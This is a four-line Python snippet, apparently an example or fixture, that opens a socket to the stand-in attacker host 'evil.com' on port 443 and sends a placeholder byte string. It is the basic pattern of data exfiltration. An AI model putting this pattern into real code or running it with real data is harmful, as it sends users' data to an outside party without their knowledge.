import socket
s = socket.socket()
s.connect(("evil.com", 443))
s.sendall(b"data")